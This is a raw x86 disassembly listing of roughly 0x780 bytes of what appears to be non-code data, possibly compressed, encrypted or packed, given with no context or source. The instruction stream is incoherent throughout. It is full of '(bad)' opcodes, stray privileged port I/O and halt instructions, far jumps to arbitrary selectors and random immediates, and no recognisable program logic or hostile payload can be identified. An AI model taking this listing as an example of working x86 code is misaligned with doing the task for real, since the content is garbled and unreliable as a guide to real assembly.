  40e158:	pop    ecx
  40e159:	cmp    ch,bl
  40e15b:	mov    ch,0x48
  40e15d:	inc    edx
  40e15e:	xchg   ebx,eax
  40e15f:	cli    
  40e160:	push   esi
  40e161:	sbb    BYTE PTR [ebx+ebp*4-0x6f4c278c],dl
  40e168:	test   DWORD PTR [ebx+0x1ee7d297],edi
  40e16e:	mov    ebp,0xbd26fc0c
  40e173:	sahf   
  40e174:	jg     0x40e165
  40e176:	cmp    ah,BYTE PTR [eax*8+0xf7991ab]
  40e17d:	or     DWORD PTR [esi+eiz*1-0x3553a66d],esp
  40e184:	pushf  
  40e185:	scas   eax,DWORD PTR es:[edi]
  40e186:	push   edx
  40e187:	inc    edx
  40e188:	hlt    
  40e189:	out    dx,al
  40e18a:	ret    
  40e18b:	mov    edi,DWORD PTR ds:0x48bf6fde
  40e191:	test   BYTE PTR [edi],cl
  40e193:	add    ecx,DWORD PTR [edi+eiz*1-0x1891c27c]
  40e19a:	mov    eax,0xb29eccdf
  40e19f:	dec    ebp
  40e1a0:	fsubrp st(4),st
  40e1a2:	hlt    
  40e1a3:	mov    bh,0x84
  40e1a5:	test   eax,0xb0ca7e46
  40e1aa:	inc    ebp
  40e1ab:	repz div BYTE PTR ds:[edi-0x65]
  40e1b0:	add    cl,BYTE PTR [ebp-0x5f]
  40e1b3:	cmp    DWORD PTR [edx+0x1a3bebdc],eax
  40e1b9:	push   eax
  40e1ba:	adc    DWORD PTR [eax-0x74],ebx
  40e1bd:	in     eax,0xdd
  40e1bf:	sub    edx,DWORD PTR [edx+0x2a]
  40e1c2:	xor    ah,BYTE PTR [edi-0x305f7071]
  40e1c8:	dec    edi
  40e1c9:	inc    eax
  40e1ca:	enter  0x641a,0xe9
  40e1ce:	xchg   DWORD PTR [ecx+ebx*2-0x68],ecx
  40e1d2:	adc    eax,DWORD PTR [edi-0x28]
  40e1d5:	jbe    0x40e248
  40e1d7:	xchg   esi,eax
  40e1d8:	int    0x1b
  40e1da:	lods   al,BYTE PTR ds:[esi]
  40e1db:	repz out 0x87,al
  40e1de:	(bad)  
  40e1df:	retf   0x913d
  40e1e2:	scas   eax,DWORD PTR es:[edi]
  40e1e3:	push   ecx
  40e1e4:	mov    ch,0xbe
  40e1e6:	dec    ecx
  40e1e7:	sbb    eax,0x37a960be
  40e1ec:	outs   dx,BYTE PTR ds:[esi]
  40e1ed:	push   ds
  40e1ee:	jb     0x40e18c
  40e1f0:	push   0x5d
  40e1f2:	inc    ebp
  40e1f3:	xchg   ecx,eax
  40e1f4:	jle    0x40e1d3
  40e1f6:	ins    DWORD PTR es:[edi],dx
  40e1f7:	sbb    ebp,DWORD PTR [ebp-0x6a45b5c2]
  40e1fd:	and    eax,0x6d940e71
  40e202:	jmp    0x40e188
  40e204:	lods   eax,DWORD PTR ds:[esi]
  40e205:	pop    es
  40e206:	fcmovne st,st(2)
  40e208:	jne    0x40e1b4
  40e20a:	(bad)
  40e20d:	pusha  
  40e20e:	dec    esi
  40e20f:	sbb    dl,dh
  40e211:	imul   ebx,ebx,0xa9fbe34f
  40e217:	sbb    esi,DWORD PTR [esi-0x33]
  40e21a:	sbb    eax,0xa2cda267
  40e21f:	xchg   ebp,eax
  40e220:	xchg   esi,eax
  40e221:	xchg   esp,eax
  40e222:	cdq    
  40e223:	js     0x40e22b
  40e225:	test   esi,esi
  40e227:	mov    eax,ds:0x8877839
  40e22c:	ja     0x40e239
  40e22e:	mov    DWORD PTR [esp+ebx*2+0x55],esp
  40e232:	js     0x40e1e5
  40e234:	iret   
  40e235:	cmp    DWORD PTR [edx],edi
  40e237:	jle    0x40e253
  40e239:	cmp    BYTE PTR [esi],0xe
  40e23c:	inc    ebx
  40e23d:	adc    edi,edx
  40e23f:	daa    
  40e240:	mov    es,edx
  40e242:	test   DWORD PTR [ebp+0x77d0fc46],edx
  40e248:	fdecstp 
  40e24a:	das    
  40e24b:	ins    BYTE PTR es:[edi],dx
  40e24c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e24d:	adc    eax,0x407a812e
  40e252:	push   ss
  40e253:	(bad)  
  40e254:	scas   al,BYTE PTR es:[edi]
  40e255:	push   eax
  40e256:	push   ebp
  40e257:	stos   DWORD PTR es:[edi],eax
  40e258:	int    0x59
  40e25a:	xor    eax,0x6d2266c0
  40e25f:	je     0x40e250
  40e261:	mov    esp,0xeea94a84
  40e266:	outs   dx,BYTE PTR ds:[esi]
  40e267:	mov    eax,ds:0x1e5dcdb5
  40e26c:	fstp   QWORD PTR gs:[ebx-0x31d43766]
  40e273:	push   es
  40e274:	jo     0x40e222
  40e276:	popf   
  40e277:	rcl    DWORD PTR [ecx+edi*1+0x5d],1
  40e27b:	ficomp WORD PTR [edi]
  40e27d:	leave  
  40e27e:	out    0xc7,al
  40e280:	repnz neg BYTE PTR [edi-0x270ac539]
  40e287:	push   ebx
  40e288:	adc    DWORD PTR [edx-0x3db323b6],edi
  40e28e:	mov    eax,ds:0x735e0f69
  40e293:	push   esp
  40e294:	cmp    DWORD PTR [ecx+0x54d8a7cd],edx
  40e29a:	call   0x6e6c442b
  40e29f:	add    eax,0xb32a0250
  40e2a4:	push   ds
  40e2a5:	loop   0x40e2f1
  40e2a7:	add    eax,0x87b9b0b
  40e2ac:	pop    es
  40e2ad:	pop    es
  40e2ae:	gs add edi,ecx
  40e2b1:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40e2b3:	mov    cl,0xf6
  40e2b5:	mov    ah,BYTE PTR [edi]
  40e2b7:	shl    BYTE PTR [ebx-0x45],0xd6
  40e2bb:	add    edi,eax
  40e2bd:	cmp    eax,0x758d97e3
  40e2c2:	mov    cl,BYTE PTR [ebp-0xfbf78fb]
  40e2c8:	dec    edi
  40e2c9:	stos   BYTE PTR es:[edi],al
  40e2ca:	xchg   DWORD PTR [eax-0x55ec26b0],esp
  40e2d0:	add    ecx,DWORD PTR [eax+0x2f]
  40e2d3:	scas   eax,DWORD PTR es:[edi]
  40e2d4:	mov    BYTE PTR [ecx-0x648dc7d9],dl
  40e2da:	retf   0xca01
  40e2dd:	jae    0x40e33b
  40e2df:	js     0x40e2f3
  40e2e1:	ret    
  40e2e2:	mov    ecx,0x784e0378
  40e2e7:	lds    ebp,FWORD PTR [ecx+edi*4-0x23df992e]
  40e2ee:	pop    ebp
  40e2ef:	cmc    
  40e2f0:	loopne 0x40e2aa
  40e2f2:	pusha  
  40e2f3:	xor    DWORD PTR ds:0x424fef4c,0xffffffec
  40e2fa:	std    
  40e2fb:	inc    ebp
  40e2fc:	lea    ebx,[ecx+0x1beb7b47]
  40e302:	sbb    DWORD PTR [ebp+0x54],0x78
  40e306:	fsubrp st(2),st
  40e308:	sub    al,0xa2
  40e30a:	xchg   BYTE PTR [edx+0x2779418d],ah
  40e310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e311:	cdq    
  40e312:	mov    ds:0x11c98be2,al
  40e317:	sub    al,0x37
  40e319:	or     al,0x6c
  40e31b:	(bad)  
  40e31c:	call   FWORD PTR [edx]
  40e31e:	jmp    FWORD PTR [ebp+0x48]
  40e321:	dec    esi
  40e322:	or     al,0x44
  40e324:	and    dh,bl
  40e326:	ds cwde 
  40e328:	(bad)  
  40e329:	adc    DWORD PTR [ecx+ebx*8+0x19],esi
  40e32d:	out    dx,al
  40e32e:	pop    ebx
  40e32f:	push   esi
  40e330:	(bad)  
  40e331:	sbb    BYTE PTR [ebx-0x657501e2],cl
  40e337:	sti    
  40e338:	pop    ds
  40e339:	fsubr  QWORD PTR [ecx-0x7f]
  40e33c:	test   DWORD PTR [edx-0xc],ecx
  40e33f:	push   0xfffffff3
  40e341:	fwait
  40e342:	add    esi,DWORD PTR [esi-0x55]
  40e345:	jp     0x40e3aa
  40e347:	sbb    ecx,ecx
  40e349:	xor    BYTE PTR [esi+edi*1-0x4e],0x9a
  40e34e:	lahf   
  40e34f:	clc    
  40e350:	enter  0x315b,0x6f
  40e354:	cmp    esi,DWORD PTR [ebx-0x27890aa5]
  40e35a:	fdivr  st,st(3)
  40e35c:	xchg   edi,eax
  40e35d:	xchg   ecx,eax
  40e35e:	(bad)  
  40e35f:	fsub   st(0),st
  40e361:	mov    ch,0x5c
  40e363:	test   eax,0x530bac13
  40e368:	adc    ebp,DWORD PTR [ebx+0x63236799]
  40e36e:	ret    
  40e36f:	aam    0x28
  40e371:	xchg   ebx,eax
  40e372:	pop    ds
  40e373:	jecxz  0x40e3af
  40e375:	dec    esi
  40e376:	daa    
  40e377:	push   esi
  40e378:	shl    DWORD PTR [esi],0x70
  40e37b:	enter  0x7054,0x85
  40e37f:	jnp    0x40e3d3
  40e381:	xor    eax,0xb542e468
  40e386:	loopne 0x40e37a
  40e388:	push   ds
  40e389:	sbb    BYTE PTR [edx],dh
  40e38b:	(bad)  
  40e38c:	sbb    DWORD PTR fs:[esi],ecx
  40e38f:	and    al,0x28
  40e391:	mov    al,ds:0xe76ab8b0
  40e396:	dec    edx
  40e397:	mov    edx,0x9692fa79
  40e39c:	lods   eax,DWORD PTR ds:[esi]
  40e39d:	loopne 0x40e41c
  40e39f:	push   0x5d
  40e3a1:	shr    BYTE PTR [edi+eax*4+0x4fd46ffc],0xd3
  40e3a9:	sar    DWORD PTR [ebp+eiz*2-0x2530d43a],1
  40e3b0:	mov    dl,0x7a
  40e3b2:	sub    al,0x1c
  40e3b4:	cdq    
  40e3b5:	int    0xe4
  40e3b7:	shl    DWORD PTR [edi+eax*4+0x6d],1
  40e3bb:	arpl   cx,di
  40e3bd:	sbb    al,0xad
  40e3bf:	pop    edx
  40e3c0:	mov    edi,0xf00c968d
  40e3c5:	icebp  
  40e3c6:	mov    dl,0xcd
  40e3c8:	sub    ebp,DWORD PTR [edx]
  40e3ca:	in     al,dx
  40e3cb:	shl    DWORD PTR [edi+0x32b4f2d5],0x98
  40e3d2:	dec    ebp
  40e3d3:	rol    DWORD PTR fs:[edx],1
  40e3d6:	xlat   BYTE PTR ds:[ebx]
  40e3d7:	mov    dh,0x2b
  40e3d9:	cmp    eax,DWORD PTR [edi]
  40e3db:	in     al,0x9f
  40e3dd:	mov    ebp,0xe4b5637b
  40e3e2:	inc    esp
  40e3e3:	mov    ds,ebp
  40e3e5:	or     DWORD PTR [ebx+0x50383530],edx
  40e3eb:	add    al,0xce
  40e3ed:	mov    ebx,DWORD PTR ds:0x6b63f082
  40e3f3:	in     eax,0x2f
  40e3f5:	pop    edi
  40e3f6:	xchg   BYTE PTR [ecx+0x229a83b6],dh
  40e3fc:	ins    DWORD PTR es:[edi],dx
  40e3fd:	lods   eax,DWORD PTR ds:[esi]
  40e3fe:	dec    BYTE PTR [esi]
  40e400:	jbe    0x40e475
  40e402:	sbb    bh,bl
  40e404:	sub    bh,BYTE PTR ds:0x81b22325
  40e40a:	aad    0x4b
  40e40c:	and    dl,bh
  40e40e:	dec    ecx
  40e40f:	mov    ch,0x3a
  40e411:	out    0x83,al
  40e413:	xor    DWORD PTR [edi-0x17],0x3b
  40e417:	jle    0x40e415
  40e419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e41a:	scas   eax,DWORD PTR es:[edi]
  40e41b:	pop    esp
  40e41c:	fcom   QWORD PTR [ebp+eax*1-0x16e0c9fb]
  40e423:	push   ebx
  40e424:	add    DWORD PTR [eax+0x16482aa2],esi
  40e42a:	stos   BYTE PTR es:[edi],al
  40e42b:	push   eax
  40e42c:	in     eax,dx
  40e42d:	inc    edx
  40e42e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e42f:	mov    cx,0xef3e
  40e433:	push   es
  40e434:	sbb    al,0x56
  40e436:	cli    
  40e437:	dec    esp
  40e438:	push   esi
  40e439:	xchg   ax,ax
  40e43b:	retf   0xb18e
  40e43e:	pop    esi
  40e43f:	out    0x42,al
  40e441:	mov    edi,0x28cdead5
  40e446:	jle    0x40e496
  40e448:	add    BYTE PTR [ecx+eax*1-0x4],0x3d
  40e44d:	add    esp,ebx
  40e44f:	out    0x7,al
  40e451:	dec    DWORD PTR [edx+0x38]
  40e454:	in     eax,0x9a
  40e456:	rcl    eax,cl
  40e458:	and    esi,DWORD PTR [ebx+eax*2]
  40e45b:	mov    WORD PTR [eax-0x62],?
  40e45e:	das    
  40e45f:	mov    bh,0xf9
  40e461:	xchg   edx,eax
  40e462:	inc    edi
  40e463:	repnz push 0x96c05f7f
  40e469:	or     al,0x86
  40e46b:	sti    
  40e46c:	pop    eax
  40e46d:	(bad)  
  40e46e:	push   cs
  40e46f:	push   edi
  40e470:	and    DWORD PTR [esi-0x3988a034],esi
  40e476:	retf   0x2303
  40e479:	jnp    0x40e460
  40e47b:	out    dx,eax
  40e47c:	and    al,0x1b
  40e47e:	xchg   ecx,eax
  40e47f:	cwde   
  40e480:	lahf   
  40e481:	sub    eax,0x1c63998f
  40e486:	or     al,0x4a
  40e488:	ins    DWORD PTR es:[edi],dx
  40e489:	popf   
  40e48a:	inc    ecx
  40e48b:	test   eax,0x9d531fdf
  40e490:	addr16 sub esi,esp
  40e493:	add    dh,bh
  40e495:	cmp    DWORD PTR [ebx-0x6],esi
  40e498:	cs adc eax,0x4c4e241f
  40e49e:	ret    0xaed5
  40e4a1:	test   cl,ch
  40e4a3:	and    cl,bh
  40e4a5:	loope  0x40e4e5
  40e4a7:	out    0xc9,al
  40e4a9:	xchg   esi,eax
  40e4aa:	jne    0x40e487
  40e4ac:	je     0x40e474
  40e4ae:	cmp    eax,eax
  40e4b0:	cmp    dl,0x9b
  40e4b3:	jp     0x40e51e
  40e4b5:	and    al,0xe6
  40e4b7:	or     al,dh
  40e4b9:	mov    cl,0xb9
  40e4bb:	adc    dh,BYTE PTR [esi+eax*4]
  40e4be:	out    0x67,eax
  40e4c0:	fstp   TBYTE PTR [ecx+0x30]
  40e4c3:	mov    ecx,0x6edbc9f4
  40e4c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4c9:	pop    ds
  40e4ca:	or     BYTE PTR [eax+ebp*8+0x45c65e6e],ch
  40e4d1:	mov    cl,0x9a
  40e4d3:	cmp    al,0x7e
  40e4d5:	mov    eax,ds:0x606d71e0
  40e4da:	cli    
  40e4db:	sub    DWORD PTR [edx+0x6a6faaf6],ecx
  40e4e1:	repnz lods al,BYTE PTR ds:[esi]
  40e4e3:	pop    edx
  40e4e4:	dec    esi
  40e4e5:	cld    
  40e4e6:	stc    
  40e4e7:	lods   al,BYTE PTR fs:[esi]
  40e4e9:	neg    dl
  40e4eb:	xor    eax,0xe6459970
  40e4f0:	cli    
  40e4f1:	mov    esi,0x75297e96
  40e4f6:	cmc    
  40e4f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4f8:	lock pop esp
  40e4fa:	or     al,0x62
  40e4fc:	add    dl,BYTE PTR [eax-0x6dffdedd]
  40e502:	not    bl
  40e504:	cs xchg esp,eax
  40e506:	inc    esi
  40e507:	sbb    DWORD PTR [eax],ebp
  40e509:	lds    ebp,FWORD PTR [edi]
  40e50b:	aam    0x4e
  40e50d:	in     eax,dx
  40e50e:	pop    ss
  40e50f:	shl    DWORD PTR [edi-0x6f],0x96
  40e513:	sbb    dh,BYTE PTR [edi+0x4d87cd26]
  40e519:	test   eax,0x798d4622
  40e51e:	jge    0x40e4a7
  40e520:	(bad)  
  40e522:	popf   
  40e523:	mov    bl,0xa7
  40e525:	mov    bl,BYTE PTR [esi+0x66e73183]
  40e52b:	hlt    
  40e52c:	jp     0x40e544
  40e52e:	dec    ebp
  40e52f:	xchg   ebx,eax
  40e530:	imul   ecx,esi,0x68
  40e533:	(bad)  
  40e534:	jge    0x40e4fc
  40e536:	not    cl
  40e538:	pop    edx
  40e539:	add    BYTE PTR [ebx-0x2ab3c2c2],dh
  40e53f:	call   0x47b28365
  40e544:	xor    BYTE PTR [esi+0x602f6517],dl
  40e54a:	add    ch,BYTE PTR [ebp-0x72]
  40e54d:	jg     0x40e50c
  40e54f:	dec    edx
  40e550:	loop   0x40e54a
  40e552:	push   fs
  40e554:	les    eax,FWORD PTR [edx-0x49]
  40e557:	pop    ebp
  40e558:	imul   ecx,DWORD PTR [edi+ecx*1+0x78],0x22
  40e55d:	jno    0x40e51f
  40e55f:	push   ds
  40e560:	inc    esi
  40e561:	in     eax,dx
  40e562:	sbb    al,0x7b
  40e564:	(bad)  
  40e565:	mov    al,ds:0x1b72c7de
  40e56a:	push   ss
  40e56b:	or     dh,BYTE PTR [edi-0x4ac4caf9]
  40e571:	mov    ecx,0x1779a07e
  40e576:	and    ebx,DWORD PTR [esi]
  40e578:	ror    BYTE PTR [ebx+0xf2e6e0a],1
  40e57e:	cdq    
  40e57f:	pop    ss
  40e580:	mov    al,ds:0xc7cc70b
  40e585:	aaa    
  40e586:	sub    dh,BYTE PTR [ebx]
  40e588:	mov    dh,0xf6
  40e58a:	and    eax,0xed419877
  40e58f:	push   esi
  40e590:	fmul   DWORD PTR [ecx+0x56]
  40e593:	xor    bh,BYTE PTR [ebx-0x23]
  40e596:	shl    DWORD PTR ds:0xd46d,cl
  40e59b:	sbb    esi,ecx
  40e59d:	or     dh,BYTE PTR [ecx-0x3752823]
  40e5a3:	scas   al,BYTE PTR es:[edi]
  40e5a4:	and    al,0x29
  40e5a6:	fld    QWORD PTR [ebp+0x42]
  40e5a9:	jl     0x40e5d6
  40e5ab:	sub    dl,ah
  40e5ad:	cmp    BYTE PTR [ebp-0x588a8c74],0x9e
  40e5b4:	(bad)  
  40e5b5:	scas   al,BYTE PTR es:[edi]
  40e5b6:	cmc    
  40e5b7:	jp     0x40e5f4
  40e5b9:	mov    ecx,0x49236a26
  40e5be:	adc    al,BYTE PTR [ecx-0xd]
  40e5c1:	dec    edi
  40e5c2:	xor    ebx,DWORD PTR [esi]
  40e5c4:	shl    DWORD PTR [eax],0x4e
  40e5c7:	mov    ebx,0xe2bcabc4
  40e5cc:	sbb    dl,BYTE PTR [edx-0xb3da3a3]
  40e5d2:	xchg   BYTE PTR [ebx+edx*8-0x2ed5c50],cl
  40e5d9:	cld    
  40e5da:	mov    ebx,0x58e6f9ae
  40e5df:	and    eax,0x2d5879b8
  40e5e4:	(bad)  
  40e5e5:	stc    
  40e5e6:	imul   bh
  40e5e8:	xlat   BYTE PTR ds:[ebx]
  40e5e9:	xchg   edx,eax
  40e5ea:	pushf  
  40e5eb:	sbb    DWORD PTR [ecx+0x76],ebx
  40e5ee:	pusha  
  40e5ef:	cld    
  40e5f0:	mov    eax,DWORD PTR [eax+ecx*2+0x28]
  40e5f4:	ss retfw 
  40e5f7:	shr    bl,1
  40e5f9:	dec    esp
  40e5fa:	mov    eax,ds:0x4641015d
  40e5ff:	fiadd  DWORD PTR [ebx]
  40e601:	xchg   ebx,eax
  40e603:	inc    ebx
  40e604:	ds adc bl,bl
  40e607:	cmp    ecx,edi
  40e609:	push   esi
  40e60a:	adc    DWORD PTR [esi-0x10e27d78],ecx
  40e610:	test   al,0x6d
  40e612:	sti    
  40e613:	push   es
  40e614:	scas   al,BYTE PTR es:[edi]
  40e615:	pop    edx
  40e616:	movsx  edx,BYTE PTR [edi]
  40e619:	(bad)  [edi-0x70c5743]
  40e61f:	fimul  DWORD PTR [ebx]
  40e621:	repz (bad) 
  40e623:	sub    edi,DWORD PTR [ebp+0x1e003853]
  40e629:	push   esp
  40e62a:	mov    gs,ebx
  40e62c:	adc    BYTE PTR [esi+ebx*4-0x7b],bl
  40e630:	sti    
  40e631:	lea    ebx,[eax+0x5f]
  40e634:	xchg   ebx,eax
  40e635:	in     eax,0x38
  40e637:	repnz stos BYTE PTR es:[edi],al
  40e639:	xor    DWORD PTR ds:0xcc722262,eax
  40e63f:	xchg   esp,eax
  40e640:	repnz sti 
  40e642:	mov    esp,0xbdbc115e
  40e647:	mov    WORD PTR [edx*1-0x6c06bca5],es
  40e64e:	(bad)  
  40e64f:	xor    bl,ah
  40e651:	xchg   ebp,eax
  40e652:	cmp    al,0xb9
  40e654:	inc    eax
  40e655:	jae    0x40e650
  40e657:	mov    edx,es
  40e659:	dec    esp
  40e65a:	mov    ebx,0x9d05b6df
  40e65f:	jo     0x40e6b3
  40e661:	pop    edi
  40e662:	dec    ebp
  40e663:	clc    
  40e664:	xor    DWORD PTR [esi-0x230a8b2e],0xffffffab
  40e66b:	iret   
  40e66c:	(bad)  
  40e66d:	(bad)  
  40e66e:	mov    esi,0x884ccd59
  40e673:	out    dx,al
  40e674:	add    cl,BYTE PTR [edi+0x5b]
  40e677:	and    dl,dh
  40e679:	dec    esp
  40e67a:	inc    BYTE PTR [eax+0x73]
  40e67d:	xor    BYTE PTR [ecx-0x6a6a3908],dl
  40e683:	cmc    
  40e684:	sbb    DWORD PTR [ebx+0x69de1ea],edi
  40e68a:	push   ds
  40e68b:	test   BYTE PTR [ebx-0xafb30b3],ch
  40e691:	aas    
  40e692:	sbb    eax,0x8bb5ceea
  40e697:	or     BYTE PTR [ebp+0x7],cl
  40e69a:	les    eax,FWORD PTR [edx]
  40e69c:	or     eax,0x247f82e0
  40e6a1:	jge    0x40e71c
  40e6a3:	add    ebp,esp
  40e6a5:	mov    al,bl
  40e6a7:	push   edx
  40e6a8:	jge    0x40e656
  40e6aa:	int    0xc6
  40e6ac:	mov    ds:0x72438c04,al
  40e6b1:	stc    
  40e6b2:	dec    edx
  40e6b3:	jg     0x40e6c1
  40e6b5:	daa    
  40e6b6:	dec    esp
  40e6b7:	dec    ebp
  40e6b8:	ins    BYTE PTR es:[edi],dx
  40e6b9:	mov    edi,0xfcd538ff
  40e6be:	mov    dh,0x47
  40e6c0:	push   0x84ac378a
  40e6c5:	pop    ecx
  40e6c6:	cdq    
  40e6c7:	push   eax
  40e6c8:	loope  0x40e674
  40e6ca:	cmp    al,0x76
  40e6cc:	mov    esp,0xc5247249
  40e6d1:	out    dx,eax
  40e6d2:	or     edx,DWORD PTR ds:0xc46a63ee
  40e6d8:	shl    BYTE PTR ds:0xe3ad0daa,0x38
  40e6df:	and    ecx,DWORD PTR [edx-0x63]
  40e6e2:	mov    al,ds:0xd7a1251c
  40e6e7:	cs jns 0x40e670
  40e6ea:	and    DWORD PTR [esi-0x7a7262ed],esp
  40e6f0:	sub    DWORD PTR [esi+0x5313cc46],esi
  40e6f6:	pushf  
  40e6f7:	sub    al,dh
  40e6f9:	or     bh,BYTE PTR [ecx]
  40e6fb:	adc    esi,esi
  40e6fd:	cmp    DWORD PTR [ebx-0x67c6f9f9],esp
  40e703:	out    dx,al
  40e704:	or     bl,dl
  40e706:	mov    esi,0x4c91e3b5
  40e70b:	gs cs mov esi,edx
  40e70f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e710:	test   DWORD PTR [ecx],edx
  40e712:	cs jmp 0x2ed3:0xcf30278b
  40e71a:	sub    BYTE PTR [edi+0xde71272],bh
  40e720:	mov    dh,BYTE PTR [eax]
  40e722:	mov    al,0x14
  40e724:	nop
  40e725:	push   ecx
  40e726:	cmp    ch,al
  40e728:	pop    edx
  40e729:	pop    ebp
  40e72a:	stos   BYTE PTR es:[edi],al
  40e72b:	ss mov ebx,0xb5a79add
  40e731:	clc    
  40e732:	clc    
  40e733:	imul   ebp,ecx,0xf69d7cd
  40e739:	sub    cl,ch
  40e73b:	loope  0x40e6dd
  40e73d:	xor    BYTE PTR [esi+0x13],bh
  40e740:	rol    BYTE PTR [ebx+0x35],1
  40e743:	(bad)
  40e746:	test   eax,0x836e871a
  40e74b:	pop    ss
  40e74c:	arpl   WORD PTR [ecx],di
  40e74e:	in     eax,0x87
  40e750:	(bad)  
  40e751:	mov    ebx,0xc43f2ccc
  40e756:	imul   ebp,DWORD PTR [ebp-0x51dec46],0xe
  40e75d:	(bad)  
  40e75e:	(bad)  
  40e75f:	jl     0x40e762
  40e761:	lods   eax,DWORD PTR ds:[esi]
  40e762:	xor    BYTE PTR [ecx-0x73ddfa3a],bh
  40e768:	fild   WORD PTR [edx]
  40e76a:	adc    ecx,DWORD PTR [ecx-0x779d5d1b]
  40e770:	dec    ebx
  40e771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e772:	mov    ?,ecx
  40e774:	pop    edi
  40e775:	pop    ebx
  40e776:	cmc    
  40e777:	jno    0x40e78b
  40e779:	jg     0x40e721
  40e77b:	pop    ss
  40e77c:	mov    bl,BYTE PTR [ebp-0x30e9c98a]
  40e782:	xor    esi,DWORD PTR [esp+edx*2+0x5ec56dc7]
  40e789:	imul   ebx,DWORD PTR [esi+0x2042ebdf],0xffffffb7
  40e790:	sbb    eax,0x7352c58
  40e795:	push   edi
  40e796:	jge    0x40e79f
  40e798:	sub    eax,0x3e3cb57
  40e79d:	out    0x59,al
  40e79f:	inc    edx
  40e7a0:	jns    0x40e761
  40e7a2:	sbb    DWORD PTR [edi],esi
  40e7a4:	arpl   WORD PTR [eax-0x4959c32],ax
  40e7aa:	sub    al,0x7c
  40e7ac:	mov    ecx,ebx
  40e7ae:	dec    eax
  40e7af:	cmc    
  40e7b0:	jo     0x40e773
  40e7b2:	jmp    0xb150:0x22e77303
  40e7b9:	fwait
  40e7ba:	pusha  
  40e7bb:	jne    0x40e77a
  40e7bd:	test   al,0x88
  40e7bf:	lea    edi,[ebx]
  40e7c1:	ss mov bl,bh
  40e7c4:	mov    dl,0x33
  40e7c6:	add    edi,DWORD PTR [eax+0x58]
  40e7c9:	imul   edx,DWORD PTR [ebx+ecx*4-0x7159cc3a],0x13
  40e7d1:	lea    edi,[eax-0x88bb060]
  40e7d7:	mov    cl,0x17
  40e7d9:	xchg   DWORD PTR [esi],eax
  40e7db:	push   ecx
  40e7dc:	pop    ss
  40e7dd:	div    BYTE PTR [edi]
  40e7df:	test   ebp,edi
  40e7e1:	inc    eax
  40e7e2:	jo     0x40e791
  40e7e4:	sbb    BYTE PTR ds:0xaf4c089,ch
  40e7ea:	ins    BYTE PTR es:[edi],dx
  40e7eb:	stos   BYTE PTR es:[edi],al
  40e7ec:	int3   
  40e7ed:	dec    ebx
  40e7ee:	in     al,dx
  40e7ef:	and    ebp,DWORD PTR [edx]
  40e7f1:	mov    esi,0x8a8cfcc4
  40e7f6:	lds    ecx,FWORD PTR ds:0x971831cf
  40e7fc:	jge    0x40e7a1
  40e7fe:	rcr    DWORD PTR [ebp-0x2249022d],0x52
  40e805:	(bad)  
  40e806:	cmp    cl,ah
  40e808:	xchg   ebx,eax
  40e809:	mov    edx,0xf0013dad
  40e80e:	pop    edi
  40e80f:	xchg   ebx,eax
  40e810:	(bad)  
  40e811:	push   ebp
  40e812:	shl    DWORD PTR [edx+eax*2-0x64],0xec
  40e817:	jecxz  0x40e826
  40e819:	in     eax,dx
  40e81a:	push   esp
  40e81b:	jnp    0x40e7b8
  40e81d:	jecxz  0x40e89b
  40e81f:	push   DWORD PTR [ecx]
  40e821:	outs   dx,BYTE PTR ds:[esi]
  40e822:	loope  0x40e899
  40e824:	mov    dh,0x50
  40e826:	dec    esi
  40e827:	pop    esi
  40e828:	mov    eax,ds:0xaa087805
  40e82d:	jle    0x40e88a
  40e82f:	sbb    edi,DWORD PTR [eax+0xa]
  40e832:	retf   0x496d
  40e835:	not    BYTE PTR [ecx-0x5d]
  40e838:	sub    dh,BYTE PTR [eax-0x60]
  40e83b:	popa   
  40e83c:	mov    esi,0xfa25973a
  40e841:	jmp    0x40e847
  40e843:	aam    0xc
  40e845:	js     0x40e891
  40e847:	push   esi
  40e848:	sub    bh,ch
  40e84a:	aaa    
  40e84b:	mov    ecx,0x9fc255cd
  40e850:	push   es
  40e851:	shl    DWORD PTR [esi],1
  40e853:	es sbb al,cl
  40e856:	and    DWORD PTR [ecx+0x41],0x94e5527b
  40e85d:	adc    ebp,DWORD PTR [edx-0x391c94d6]
  40e863:	cmp    dl,BYTE PTR [edx-0x77]
  40e866:	dec    esi
  40e867:	loope  0x40e85c
  40e869:	daa    
  40e86a:	mov    ebp,0x2924cc4d
  40e86f:	pushf  
  40e870:	icebp  
  40e871:	fnsave [eax]
  40e873:	mov    esp,0xad712259
  40e878:	push   ecx
  40e879:	jno    0x40e8d8
  40e87b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e87c:	adc    esi,edx
  40e87e:	ret    0xb662
  40e881:	mov    ch,0x58
  40e883:	sar    DWORD PTR [eax+ebp*2-0x52ca5251],cl
  40e88a:	inc    ebx
  40e88b:	and    dl,cl
  40e88d:	xchg   dl,dl
  40e88f:	test   eax,0xe10919e7
  40e894:	add    esi,DWORD PTR [eax+0x1b]
  40e897:	fs ret 0x673b
  40e89b:	or     BYTE PTR [ebp-0xe],ah
  40e89e:	mov    edx,DWORD PTR [eax-0x1e552c9e]
  40e8a4:	adc    eax,edx
  40e8a6:	sbb    eax,DWORD PTR [edi+0x3718b50d]
  40e8ac:	push   es
  40e8ad:	sti    
  40e8ae:	inc    esp
  40e8af:	xor    eax,0xa4ee4774
  40e8b4:	push   eax
  40e8b5:	jo     0x40e929
  40e8b7:	dec    esp
  40e8b8:	adc    DWORD PTR [edx+0x2b749593],esi
  40e8be:	xor    eax,0xc52b4190
  40e8c3:	lahf   
  40e8c4:	xchg   edx,eax
  40e8c5:	jp     0x40e89b
  40e8c7:	stc    
  40e8c8:	das    
  40e8c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8ca:	mov    ah,0x2f
  40e8cc:	scas   eax,DWORD PTR es:[edi]
  40e8cd:	cli    
  40e8ce:	jg     0x40e90e
  40e8d0:	and    dl,dl
  40e8d2:	(bad)  ds:[esi-0x1bc9c641]
  40e8d9:	sbb    dl,BYTE PTR [ebx-0x3f]
  40e8dc:	sbb    BYTE PTR [ebp+0x71a064d2],0x9f
